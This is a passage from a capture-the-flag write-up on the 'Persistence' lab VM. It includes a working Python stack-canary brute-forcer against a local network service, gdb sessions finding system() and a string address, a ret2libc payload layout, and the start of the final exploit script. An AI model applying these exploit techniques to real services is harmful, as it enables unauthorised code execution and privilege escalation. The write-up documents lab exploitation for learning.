<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">30</span>  <span class="c"># amount of bytes before the first canary bit is hit</span>
</span><span class='line'><span class="n">canary</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>         <span class="c"># the canary</span>
</span><span class='line'>
</span><span class='line'><span class="c"># start the canary brute loop. We want to brute 4 bytes ...</span>
</span><span class='line'><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">5</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># ... and try all possibilities</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">canary_byte</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">):</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># prepare the byte</span>
</span><span class='line'>        <span class="n">hex_byte</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">canary_byte</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># prepare the payload</span>
</span><span class='line'>        <span class="n">send</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="n">canary</span> <span class="o">+</span> <span class="n">hex_byte</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[+] Trying: &#39;</span><span class="se">\\</span><span class="s">x{0}&#39; in payload &#39;</span><span class="si">%s</span><span class="s">&#39; (</span><span class="si">%d</span><span class="s">:</span><span class="si">%d</span><span class="s">/255)&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hex_byte</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span> <span class="o">%</span> <span class="p">(</span><span class="n">send</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">canary_byte</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">3333</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># get the inital banners</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">35</span><span class="p">)</span>   <span class="c"># [+] hello, my name is sploitable\n</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">40</span><span class="p">)</span>   <span class="c"># [+] would you like to play a game?\n</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>    <span class="c"># &gt;</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># send the payload  </span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">send</span><span class="p">)</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">27</span><span class="p">)</span>   <span class="c"># [+] yeah, I don&#39;t think so\n</span>
</span><span class='line'>
</span><span class='line'>        <span class="c"># if we have a OK response, then we will have this last part</span>
</span><span class='line'>        <span class="c"># as &#39;[+] bye!\n&#39; populated, if its wrong, not</span>
</span><span class='line'>        <span class="n">data</span> <span class="o">=</span>  <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span>   <span class="c"># [+] bye!\n</span>
</span><span class='line'>        <span class="k">if</span> <span class="s">&quot;bye&quot;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&quot;[!!] Found a possible canary value of &#39;{0}&#39;!&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">hex_byte</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span>
</span><span class='line'>            <span class="n">canary</span> <span class="o">+=</span> <span class="n">hex_byte</span>
</span><span class='line'>            <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>            <span class="k">break</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># if we cant even find the first byte, we failed already</span>
</span><span class='line'>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&quot;[-] Unable to even find the first bit. No luck&quot;</span>
</span><span class='line'>        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[+] Canary seems to be {0}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">canary</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&quot;hex&quot;</span><span class="p">))</span>
</span><span class='line'><span class="k">else</span><span class="p">:</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&quot;[-] Unable to brute canary&quot;</span>
</span></code></pre></td></tr></table></div></figure>


<p>An example run of this would end as follows:</p>

<figure class='code'><figcaption><span>Running canary_brute.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>+<span class="o">]</span> Trying: <span class="s1">&#39;\x8d&#39;</span> in payload <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="o">(</span>4:141/255<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Trying: <span class="s1">&#39;\x8e&#39;</span> in payload <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="o">(</span>4:142/255<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Trying: <span class="s1">&#39;\x8f&#39;</span> in payload <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="o">(</span>4:143/255<span class="o">)</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Trying: <span class="s1">&#39;\x90&#39;</span> in payload <span class="s1">&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;</span> <span class="o">(</span>4:144/255<span class="o">)</span>
</span><span class='line'><span class="o">[</span>!!<span class="o">]</span> Found a possible canary value of <span class="s1">&#39;90&#39;</span>!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Canary seems to be 00ef8d90
</span></code></pre></td></tr></table></div></figure>


<p>Winning. Just to make 100% sure I actually have the correct canary, I made another small socket program just to append the canary to the initial 30 A&rsquo;s and send it. No stack smashing message appeared and we got the <em>bye</em> message :)</p>

<h2>wopr &ndash; NX and EIP</h2>

<p>If you can recall from earlier, <code>wopr</code> was compiled with the NX bit set. Effectively that means we can&rsquo;t simply exploit this vulnerability by setting EIP to the beginning of shellcode we simply sent along with the payload as the stack is not executable. Thankfully though, there is a concept such as ret2libc.</p>

<p>The idea behind ret2libc is to steer the application flow to useful commands within libc itself, and get code execution that way. A very popular function to use is the <code>system()</code> command, for almost obvious reasons.</p>

<p>I decided to make use of the same method. I quickly checked to see if ASLR was enabled on the Persistence VM:</p>

<figure class='code'><figcaption><span>ASLR check</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>ldd /usr/local/bin/wopr
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7fff000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/libc.so.6 <span class="o">(</span>0xb7e62000<span class="o">)</span>
</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x00110000<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>bash-4.1<span class="nv">$ </span>ldd /usr/local/bin/wopr
</span><span class='line'>    linux-gate.so.1 <span class="o">=</span>&gt;  <span class="o">(</span>0xb7fff000<span class="o">)</span>
</span><span class='line'>    libc.so.6 <span class="o">=</span>&gt; /lib/libc.so.6 <span class="o">(</span>0xb7e62000<span class="o">)</span>
</span><span class='line'>    /lib/ld-linux.so.2 <span class="o">(</span>0x00110000<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The addresses for the linked files remained static between all of the lookups, indicating that ASLR was not enabled. This makes things slightly easier. Because this is a 32bit OS though, even if it was enabled it would not have been too much of a issue :)</p>

<p>The next step was to find out where system() lived in libc. This is also a very easy step to perform. A interesting note here. GDB was using the SHELL env variable for commands, and because I have come from rbash, it was still set to that. A simple <code>export SHELL=/bin/bash</code> fixed it though. Also, just to be clear, I am now doing this address lookup on the Persistence VM, however I had to do exactly the same thing on the Kali VM where I was building my exploit.</p>

<figure class='code'><figcaption><span>finding system()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span><span class="nb">export </span><span class="nv">SHELL</span><span class="o">=</span>/bin/bash
</span><span class='line'>
</span><span class='line'>bash-4.1<span class="nv">$ </span>gdb -q /usr/bin/telnet
</span><span class='line'>Reading symbols from /usr/bin/telnet...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>Missing separate debuginfos, use: debuginfo-install telnet-0.17-47.el6_3.1.i686
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> b *main   <span class="c"># set a breakpoint to stop the flow once we hit the main() func</span>
</span><span class='line'>Breakpoint 1 at 0x7b90
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r         <span class="c"># run the program</span>
</span><span class='line'>Starting program: /usr/bin/telnet
</span><span class='line'>Breakpoint 1, 0x00117b90 in main <span class="o">()</span>
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> p system  <span class="c"># We hit our breakpoint, lets leak the address for system()</span>
</span><span class='line'><span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7e56210 &lt;system&gt;
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>We find <code>system()</code> at <code>0xb7e56210</code>. I used the telnet binary simply because it is also linked to libc.</p>

<p>So to sum up what we have so far, lets take another look at what the stack will look like now when sending our exploit payload:</p>

<figure class='code'><figcaption><span>Stack after memory corruption up to EIP</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;           - &gt;
</span><span class='line'>
</span><span class='line'>[   A x 30   ] [  \xff\xff\xff\xff  ] [  AAAA  ] [  \x10\x62\xe5\xb7  ]
</span><span class='line'> ^~ Initial BF    ^~ Bruted cookie                    ^~ system()
</span><span class='line'>
</span><span class='line'>- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;           - &gt;
</span></code></pre></td></tr></table></div></figure>


<p>The address for <code>system()</code> is &lsquo;backwards&rsquo; because we are working with a <a href="http://en.wikipedia.org/wiki/Endianness">little endian</a> system. The 4 * A before the address to <code>system()</code> is simply padding to EIP.</p>

<h2>wopr &ndash; code exec</h2>

<p>This part, by far, took me <strong>the longest</strong> of the entire challenge!</p>

<p>The next step was to get actual code to execute using <code>system()</code>. While this may sound trivial, it has challenges of its own. One of the key things I had to realize whilst getting frustrated with this was &ldquo;to remember, you are trying to make a program do what it is not intended to do, expect difficulty!&rdquo;.</p>

<p>I tried to put a command in a env variable and failed.<br/>
I attempted to write a ROP chain and failed.</p>

<p>These failed mostly due to by own lack of understanding, tiredness and frustration. My attempts generally was to get a script <code>/tmp/runme</code> to run. <code>runme</code> was a bash script that will compile a small C shell, change ownership and set the suid bit. Yes, Persistence had <code>gcc</code> installed :)</p>

<p>&ldquo;fail&rdquo; * 100000 * 100000. That is a rough guestimate of the amount of times I tried this part.</p>

<p>Eventually, I finally came to the realization that I may have to search for other avenues of code execution. In fact, I completely stepped away from the VM and did something else.</p>

<p>Returning later with a fresh look, I run wopr through <code>strings</code> one more time:</p>

<figure class='code'><figcaption><span>wopr strings</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/persistence# strings  wopr
</span><span class='line'>/lib/ld-linux.so.2
</span><span class='line'>__gmon_start__
</span><span class='line'>libc.so.6
</span><span class='line'>_IO_stdin_used
</span><span class='line'>
</span><span class='line'><span class="o">[</span>.. snip ..<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="o">[</span>^_<span class="o">]</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> yeah, I don<span class="err">&#39;</span>t think so
</span><span class='line'>socket
</span><span class='line'>setsockopt
</span><span class='line'><span class="nb">bind</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="nb">bind complete</span>
</span><span class='line'>listen
</span><span class='line'>/tmp/log          <span class="c"># &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;</span>
</span><span class='line'>TMPLOG
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> waiting <span class="k">for </span>connections
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> logging queries to <span class="nv">$TMPLOG</span>
</span><span class='line'>accept
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> got a connection
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> hello, my name is sploitable
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> would you like to play a game?
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> bye!
</span></code></pre></td></tr></table></div></figure>


<p>See that? Can you <strong>see</strong> that&hellip; We have <code>/tmp/log</code> RIGHT THERE!</p>

<p>I confirmed that <code>/tmp/log</code> wasn&rsquo;t actually in use, and moved my original <code>/tmp/runme</code> script there.</p>

<p>The only thing that was left now was to find the location of the string <code>/tmp/log</code> in <code>wopr</code>, push that to the stack, and ride the bus home. So lets do the hard work required to find this valuable piece of the puzzle:</p>

<figure class='code'><figcaption><span>finding</span><a href='/tmp/log'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# gdb -q ./wopr
</span><span class='line'>Reading symbols from wopr...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>
</span><span class='line'>gdb-peda<span class="nv">$ </span>b *main
</span><span class='line'>Breakpoint 1 at 0x80487de
</span><span class='line'>
</span><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'><span class="o">[</span>----------------------------------registers-----------------------------------<span class="o">]</span>
</span><span class='line'>EAX: 0xbffff4a4 --&gt; 0xbffff60a <span class="o">(</span><span class="s2">&quot;wopr&quot;</span><span class="o">)</span>
</span><span class='line'>EBX: 0xb7fbfff4 --&gt; 0x14bd7c
</span><span class='line'>ECX: 0x66a6f92e
</span><span class='line'>EDX: 0x1
</span><span class='line'>ESI: 0x0
</span><span class='line'>EDI: 0x0
</span><span class='line'>EBP: 0xbffff478 --&gt; 0x0
</span><span class='line'>ESP: 0xbffff3fc --&gt; 0xb7e8ae36 <span class="o">(</span>&lt;__libc_start_main+230&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax<span class="o">)</span>
</span><span class='line'>EIP: 0x80487de <span class="o">(</span>&lt;main&gt;: push   ebp<span class="o">)</span>
</span><span class='line'>EFLAGS: 0x246 <span class="o">(</span>carry PARITY adjust ZERO sign <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>   0x80487d7 &lt;get_reply+99&gt;:    call   0x804865c &lt;__stack_chk_fail@plt&gt;
</span><span class='line'>   0x80487dc &lt;get_reply+104&gt;:   leave
</span><span class='line'>   0x80487dd &lt;get_reply+105&gt;:   <span class="nv">ret</span>
</span><span class='line'><span class="o">=</span>&gt; 0x80487de &lt;main&gt;:    push   ebp
</span><span class='line'>   0x80487df &lt;main+1&gt;:  mov    ebp,esp
</span><span class='line'>   0x80487e1 &lt;main+3&gt;:  sub    esp,0x258
</span><span class='line'>   0x80487e7 &lt;main+9&gt;:  mov    eax,DWORD PTR <span class="o">[</span>ebp+0x8<span class="o">]</span>
</span><span class='line'>   0x80487ea &lt;main+12&gt;: mov    DWORD PTR <span class="o">[</span>ebp-0x23c<span class="o">]</span>,eax
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xbffff3fc --&gt; 0xb7e8ae36 <span class="o">(</span>&lt;__libc_start_main+230&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax<span class="o">)</span>
</span><span class='line'>0004<span class="p">|</span> 0xbffff400 --&gt; 0x1
</span><span class='line'>0008<span class="p">|</span> 0xbffff404 --&gt; 0xbffff4a4 --&gt; 0xbffff60a <span class="o">(</span><span class="s2">&quot;wopr&quot;</span><span class="o">)</span>
</span><span class='line'>0012<span class="p">|</span> 0xbffff408 --&gt; 0xbffff4ac --&gt; 0xbffff629 <span class="o">(</span><span class="s2">&quot;SSH_AGENT_PID=3171&quot;</span><span class="o">)</span>
</span><span class='line'>0016<span class="p">|</span> 0xbffff40c --&gt; 0xb7fe08d8 --&gt; 0xb7e74000 --&gt; 0x464c457f
</span><span class='line'>0020<span class="p">|</span> 0xbffff410 --&gt; 0xb7ff6821 <span class="o">(</span>mov    eax,DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">])</span>
</span><span class='line'>0024<span class="p">|</span> 0xbffff414 --&gt; 0xffffffff
</span><span class='line'>0028<span class="p">|</span> 0xbffff418 --&gt; 0xb7ffeff4 --&gt; 0x1cf2c
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Breakpoint 1, 0x080487de in main <span class="o">()</span>
</span><span class='line'>
</span><span class='line'>gdb-peda<span class="nv">$ </span>searchmem /tmp/log
</span><span class='line'>Searching <span class="k">for</span> <span class="s1">&#39;/tmp/log&#39;</span> in: None ranges
</span><span class='line'>Found 2 results, display max 2 items:
</span><span class='line'>wopr : 0x8048c60 <span class="o">(</span><span class="s2">&quot;/tmp/log&quot;</span><span class="o">)</span>
</span><span class='line'>wopr : 0x8049c60 <span class="o">(</span><span class="s2">&quot;/tmp/log&quot;</span><span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>/tmp/log</code> can be found in 2 places. Lets choose <code>0x8048c60</code>! Now we finally have everything we need to build the payload to send.</p>

<h2>wopr &ndash; the exploit</h2>

<p>To sum up what we have to do to exploit this, we can say that we have to:</p>

<ul>
<li>Provide a string of size 30</li>
<li>Provide the canary we have brute forced</li>
<li>Pad with 4 bytes</li>
<li>Write EIP to the location of <code>system()</code></li>
<li>Provide 4 bytes of JUNK (or the location of <code>exit()</code> as a return)</li>
<li>Provide the location of <code>/tmp/log</code></li>
</ul>


<p>In my exploit, as a result of the above, I would therefore send a payload similar to this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot; + &quot;\xff\xff\xff\xff&quot; + &quot;AAAA&quot; +
</span><span class='line'>&quot;\x10\xc2\x16\x00&quot; + &quot;JUNK&quot; + &quot;\x60\x8c\x04\x08&quot;
</span></code></pre></td></tr></table></div></figure>


<p>I finished up coding the exploit, which eventually resulted in the following:</p>

<figure class='code'><figcaption><span>Persistence Sploit</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">30</span>  <span class="c"># amount of bytes to before the canary is hit</span>
</span><span class='line'><span class="n">canary</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>     <span class="c"># canary that should update as its bruted</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;&quot;&quot;</span>
</span><span class='line'><span class="s">            A: &quot;So, I heard you like pain...?&quot;</span>
</span><span class='line'><span class="s">            B: &quot;... a bit&quot;</span>
</span><span class='line'><span class="s">            C: &quot;Well, here it is, the: &quot;</span>
</span><span class='line'><span class="s"> ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___ </span>
</span><span class='line'><span class="s">|    \ /  _]|    \  / ___/|    / ___/|      |  /  _]|    \   /  ]  /  _]</span>
